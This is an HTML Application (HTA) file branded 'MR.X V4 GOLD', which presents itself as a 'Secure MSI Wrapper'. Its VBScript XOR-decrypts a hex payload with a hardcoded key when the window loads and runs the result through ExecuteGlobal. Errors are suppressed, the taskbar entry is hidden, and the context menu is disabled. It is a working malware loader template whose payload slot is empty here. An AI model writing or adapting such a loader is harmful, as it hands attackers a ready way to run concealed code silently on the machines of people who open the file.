<!DOCTYPE html>
<html>
<head>
    <title>MR.X V4 GOLD PROTECTED</title>
    <hta:application id="oHTA" showintaskbar="no" windowstate="normal" scroll="no" contextmenu="no" selection="no" />
    <script language="vbs">
        ' --- MR.X V4 GOLD Secure MSI Wrapper ---
        
        Function DecryptPayload(hexBlob, key)
            Dim out, i, b, ki
            out = ""
            For i = 1 To Len(hexBlob) Step 2
                b = CByte("&H" & Mid(hexBlob, i, 2))
                ki = ((i - 1) \ 2 Mod Len(key)) + 1
                out = out & Chr(b Xor Asc(Mid(key, ki, 1)))
            Next
            DecryptPayload = out
        End Function
        
        Sub Window_OnLoad
            On Error Resume Next
            Dim payload, key, plain
            payload = ""
            key = "52hARmTw1DzzFChw"
            plain = DecryptPayload(payload, key)
            ExecuteGlobal plain
            document.open : document.write plain : document.close
        End Sub
    </script>
</head>
<body style="background-color:black; color:#d4af37; font-family:Consolas; text-align:center;">
    <h2 style="color:#d4af37;">MR.X V4 GOLD</h2>
    <p>Secure MSI Payload Initialized.</p>
</body>
</html>